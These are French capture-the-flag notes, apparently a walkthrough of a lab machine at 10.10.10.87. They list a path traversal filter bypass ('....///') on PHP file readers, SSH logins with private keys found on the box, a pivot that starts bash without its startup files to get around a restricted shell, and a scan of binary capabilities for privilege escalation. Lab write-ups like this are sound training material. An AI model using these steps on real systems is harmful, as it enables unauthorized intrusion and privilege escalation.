@@ -1,0 +1,21 @@
+se balader grave a dirRead.php fileRead.php 
+attention a la protection ../ disparais donc utiliser ....///....///
+se log en ssh avec nobody@10.10.10.87 -i #la private key trouvée#
+
+ssh -i /home/nobody/.ssh/.monitor monitor@172.17.0.1 -t bash --noprofile --norc
+
+--noprofile
+             Do  not  read  either  the system-wide startup file /etc/profile or any of the personal
+             initialization files ~/.bash_profile, ~/.bash_login, or ~/.profile.  By  default,  bash
+             reads these files when it is invoked as a login shell (see INVOCATION below).
+--norc Do  not  read  and execute the system wide initialization file /etc/bash.bashrc and the
+             personal initialization file ~/.bashrc if the shell is interactive.  This option is  on
+             by default if the shell is invoked as sh.
+ssh private key 
+	/USER/.ssh/id_rsnca
+	chmod 600 le fichier
+	ssh user@ip -i private_key
+
+faire en sorte d'avoir dans mon PATH le PATH de getcap
+utiliser getcap pour voir les capabilitée des binaires 
+getcap -r / 2>/dev/null
